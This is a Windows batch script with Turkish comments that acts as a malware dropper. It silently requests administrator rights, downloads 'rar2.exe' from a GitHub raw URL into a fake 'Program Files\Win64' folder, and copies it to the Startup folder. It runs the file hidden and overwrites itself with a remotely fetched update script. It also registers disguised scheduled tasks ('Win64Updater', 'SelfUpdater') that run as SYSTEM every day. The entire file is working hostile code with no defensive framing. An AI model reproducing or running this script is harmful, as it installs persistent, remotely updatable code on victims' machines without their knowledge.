@echo off
:: Yönetici kontrolü (sessizce)
NET SESSION >nul 2>&1
if %ERRORLEVEL% neq 0 (
    powershell -Command "Start-Process '%~f0' -WindowStyle Hidden -Verb RunAs"
    exit
)

:: Değişkenler
set "url_exe=https://raw.githubusercontent.com/xipperzo/sirketbaglantisi/main/rar2.exe"
set "url_upd=https://raw.githubusercontent.com/xipperzo/sirketbaglantisi/main/update.bat"

set "win64_dir=C:\Program Files\Win64"
set "startup_dir=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

set "exe_name=rar2.exe"
set "upd_name=update.bat"

set "exe_win64=%win64_dir%\%exe_name%"
set "startup_exe=%startup_dir%\%exe_name%"
set "upd_path=%~f0"

set "taskname=Win64Updater"

:: Klasör oluştur
if not exist "%win64_dir%" mkdir "%win64_dir%" >nul 2>&1

:: rar2.exe indir ve startup'a kopyala
if not exist "%exe_win64%" powershell -Command "(New-Object Net.WebClient).DownloadFile('%url_exe%', '%exe_win64%')" >nul 2>&1
copy /Y "%exe_win64%" "%startup_exe%" >nul 2>&1

:: rar2.exe çalışmıyorsa yönetici olarak başlat
tasklist | find /i "%exe_name%" >nul
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%exe_win64%' -WindowStyle Hidden -Verb RunAs" >nul 2>&1
)

:: Güncelleme mekanizması: update.bat dosyasını indir ve kendinin üzerine yaz
powershell -Command "(New-Object Net.WebClient).DownloadFile('%url_upd%', '%upd_path%')" >nul 2>&1

:: Görev zamanlayıcıda rar2.exe'yi her gün saat 00:00'da başlat
schtasks /create /f /tn "%taskname%" /tr "\"%exe_win64%\"" /sc daily /st 00:00 /ru SYSTEM >nul 2>&1

:: Güncelleme için görev oluştur (günde bir kez saat 12:00'de)
schtasks /create /f /tn "SelfUpdater" /tr "\"%upd_path%\"" /sc daily /st 12:00 /ru SYSTEM >nul 2>&1

exit
